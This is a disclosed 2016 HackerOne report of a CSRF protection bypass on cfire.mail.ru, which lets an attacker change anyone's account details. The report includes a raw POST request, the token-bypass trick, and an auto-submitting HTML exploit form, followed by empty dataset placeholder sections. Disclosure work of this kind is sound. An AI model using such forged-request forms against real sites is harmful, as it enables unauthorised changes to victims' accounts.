---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '161408'
original_report_id: '161408'
title: '[cfire.mail.ru] CSRF Bypassed - Changing anyone''s ''User Info'''
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2016-08-19T18:47:08.275Z'
disclosed_at: '2016-09-09T15:39:10.934Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# [cfire.mail.ru] CSRF Bypassed - Changing anyone's 'User Info'

## Metadata

- HackerOne Report ID: 161408
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2016-09-09T15:39:10.934Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I noticed that when we change `userinfo` of https://cfire.mail.ru from here: [https://cfire.mail.ru/account/#userinfo], there are two Anti-CSRF tokens (or you can say that; they just do the work of Anti-CSRF token): 
- `signature`
- `submit2`

Actually, I was able to bypass both Anti-CSRF tokens, and after the bypass, I was able to change anyone's user info (e.g First Name)

#PoC
Server-side authentication of CSRF token isn't properly validating the Anti-CSRF tokens/values in the `signature` and `submit2` parameters of the POST request when changing user info of a https://cfire.mail.ru account.

##HTTP POST REQUEST:
```
POST /account/ HTTP/1.1
Host: cfire.mail.ru
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cfire.mail.ru/account/
Cookie: <cookies-here.
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

signature=<csrf-token here>&firstname=Hacked&lastname=&bdday=0&bdmonth=0&bdyear=0&postindex=&country=&city=&address=&submit2=<another 9-character csrf-token here>
```

Removing the value of `signature` AND changing the value of `submit2` to `XXXXXXXXX` will bypass both protections ;) 

##Exploit Code:
So, we can exploit it with the following code:

```
<html>
  <body>
    <form action="https://cfire.mail.ru/account/" method="POST" name="exploit">
      <input type="hidden" name="signature" value="" />
      <input type="hidden" name="firstname" value="Pwn3d" />
      <input type="hidden" name="lastname" value="" />
      <input type="hidden" name="bdday" value="0" />
      <input type="hidden" name="bdmonth" value="0" />
      <input type="hidden" name="bdyear" value="0" />
      <input type="hidden" name="postindex" value="" />
      <input type="hidden" name="country" value="" />
      <input type="hidden" name="city" value="" />
      <input type="hidden" name="address" value="" />
      <input type="hidden" name="submit2" value="XXXXXXXXX" />
    </form>
	<script>document.exploit.submit()</script>
  </body>
</html>
```

In the above exploit code, only the value of Fist Name will be changed, but any value can be changed; you just have to edit the code, and change the value of the parameters! 

**P.S:** *I used JavaScript to execute the code; so only by accessing a page with the code will change the first name to `Pwn3d`*

So, if you execute the above code locally in your browser; your first name will be changed to `Pwn3d`.

###Testing Environment
>**Browser:** Firefox [version 45.0]
**OS:** Windows 8.1
**User Agent:** Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0

If you have any other questions or if anything needs clarification, please let me know. ✌

Cheers,
Ahsan

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
